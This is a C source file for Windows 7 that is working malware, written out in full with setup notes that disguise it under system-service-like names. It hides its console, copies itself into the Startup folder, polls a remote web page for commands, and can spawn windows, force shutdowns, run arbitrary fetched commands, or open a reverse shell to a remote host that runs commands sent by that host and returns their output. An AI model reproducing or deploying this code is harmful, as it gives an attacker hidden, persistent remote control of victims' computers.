//code by - cyber_magician001
//for outdated windows7 with powershell2
//compiled program must be named "system-service-get.exe"
//MainFile: system-service-get; cURLFile: system-get;
//need to get cURL for this to work
//then rename curl folder to system-get
//rename curl.exe to system-get
//add location in path
//		"Annarasumanara"
//////////////////////////////////////////

#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<winsock2.h>
#include<windows.h>
//#include<unistd.h>
#include<winuser.h>
#include<wininet.h>
#include<sys/stat.h>
#include<sys/types.h>


int main()
{
	HWND ninja;
	ninja = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(ninja, 0);

	//////////////////////////
	printf("\n\n\n\n\t\t\tcyber_magician001\n");
	//////////////////////////

	char icommand[300];
	char location[200];
	char buff[300];

	
	FILE *cfp;
	cfp = _popen("powershell [system.environment]::getfolderpath(7)", "r");
	fgets(location, sizeof(location), cfp);
	snprintf(buff, sizeof(buff), "copy system-service-get.exe \"%s\"", location);
	system(buff);
	fclose(cfp);

	while(1){
		memset(&icommand, 0, sizeof(icommand));
		FILE *fp;
		fp = _popen("system-get --insecure https://dwayk01.github.io/share/magic.txt", "r");	//command to retrive from here
		fgets(icommand, sizeof(icommand), fp);
		/////////////////////////////////
		printf("command: %s", icommand);
		/////////////////////////////////
		if(icommand[0] == '0'){
			sleep(5);
			fclose(fp);
			continue;
		}else if(icommand[0] == '1'){
			int j = 0;
			while(j <= 75){
				system("start cd /");
				j++;
			}
			system("shutdown -s -t 10 -c \"what is love???\"");
		}else if(icommand[0] == '2'){
			int k = 0;
			while(k <= 15){
				system("start cd /");
				system("start cd /");
				system("start cd /");
				system("start cd /");
				system("start cd /");
				system("start cd /");
				k++;
			}
			system("shutdown -s -t 10 -c \"what is love???\"");
		}else if(icommand[0] == 'r'){
				system("start https://youtu.be/dQw4w9WgXcQ");
		}else if(icommand[0] == 'x'){
			system("shutdown -s -t 10 -c \"what is love???\"");
		}else if(icommand[0] == 'a' && icommand[1] == 'n'){			
			
			char master[50];
			FILE *sfp;
			sfp = _popen("system-get --insecure https://dwayk01.github.io/share/m.txt", "r");
			fgets(master, sizeof(master), sfp);
			fclose(sfp);
			////////////////////////////////////
			printf("master: %s", master);
			///////////////////////////////////
			WSADATA wsaDATA;
			if(WSAStartup(MAKEWORD(2, 0), &wsaDATA) != 0){
				sleep(10);
				continue;
			}

			int network_socket;
			network_socket = socket(AF_INET, SOCK_STREAM, 0);
			
			struct sockaddr_in server_address;
			server_address.sin_family = AF_INET;
			server_address.sin_port = htons(9001);
			server_address.sin_addr.s_addr = inet_addr(master);
			
			int connection_status;
			int i = 0;
			while(1){
				connection_status = connect(network_socket, (struct sockaddr *)&server_address, sizeof(server_address));
				fflush(stdout);
				if(connection_status == -1){
					if(i == 0){
						printf("[-]error connecting!!!\n");
	
					}
					sleep(10);
					continue;
				}else{
					printf("[+]connected successfully.\n");
					break;
				}
			}

			char server_message[200];
			char container[1000];
			char total[1999];
			while(1){
				memset(&server_message, 0, sizeof(server_message));
				memset(&container, 0, sizeof(container));
				memset(&total, 0, sizeof(total));
				recv(network_socket, server_message, sizeof(server_message), 0);
				if(server_message[0] == 'Q'){
					printf("[+]Quit signal received\n");
					break;
				}
				FILE *filepointer;
				filepointer = _popen(server_message, "r");
				while(fgets(container, sizeof(container), filepointer) != 0){
					strcat(total, container);
				}
				send(network_socket, total, sizeof(total), 0);
				fclose(filepointer);
			}
			close(network_socket);

		}else{
			system(icommand);
		}
		
		fclose(fp);
		sleep(30);
		}

	return 0;
}



//////////------------COMPLETED-CODE------------/////////////////